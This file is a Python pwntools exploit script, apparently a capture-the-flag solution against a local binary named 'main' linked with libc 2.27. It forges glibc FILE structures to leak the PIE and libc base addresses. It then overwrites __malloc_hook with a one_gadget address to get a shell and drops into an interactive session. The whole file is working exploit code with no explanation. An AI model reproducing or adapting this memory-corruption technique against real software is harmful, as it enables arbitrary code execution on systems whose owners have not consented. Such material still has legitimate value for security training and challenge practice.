from pwn import*
context(log_level='DEBUG',arch='AMD64')
def FILE(_flags=0,_IO_read_ptr=0,_IO_read_end=0,_IO_read_base=0,_IO_write_base=0,_IO_write_ptr=0,_IO_write_end=0,_IO_buf_base=0,_IO_buf_end=1,_fileno=0,_chain=0):
	fake_IO = flat([
	_flags,
	_IO_read_ptr,	_IO_read_end,	_IO_read_base,
	_IO_write_base,	_IO_write_ptr,	_IO_write_end,
	_IO_buf_base,	_IO_buf_end])
	fake_IO += flat([0,0,0,0,_chain,_fileno])
	fake_IO += flat([0xFFFFFFFFFFFFFFFF,0,0,0xFFFFFFFFFFFFFFFF,0,0])
	fake_IO += flat([0,0,0,0xFFFFFFFF,0,0])
	return fake_IO
p = process('./main')
libc = ELF('./libc-2.27.so',checksec=False)
p.recvuntil('location to ')
pie = int(p.recvuntil('\n',drop=True),16) - 0x202010
log.info('PIE:\t' + hex(pie))
fake_IO = FILE(_flags = 0xFBAD8800,_IO_write_base = pie + 0x201FE0,_IO_write_ptr = pie+ 0x201FE0 + 8,_fileno = 1,_IO_read_end=pie + 0x201FE0)
payload  = '\x00'*0x10
payload += p64(pie+0x202028)
payload += fake_IO
p.sendline(payload)
p.sendline('FMYY')
p.recvuntil('permitted!\n')
libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc_hook = libc_base + libc.sym['__realloc_hook']
realloc = libc_base + libc.sym['realloc']
one_gadget = 0x4F2C5 + libc_base
fake_IO_write = FILE(_flags = 0xFBAD8000,_IO_write_ptr = malloc_hook,_IO_write_end = malloc_hook + 8,_fileno = 0)
payload  = p64(one_gadget) + p64(0)
payload += p64(pie+0x202028)
payload += fake_IO_write
p.sendline(payload)
gdb.attach(p)
p.sendline('%n')
p.interactive()


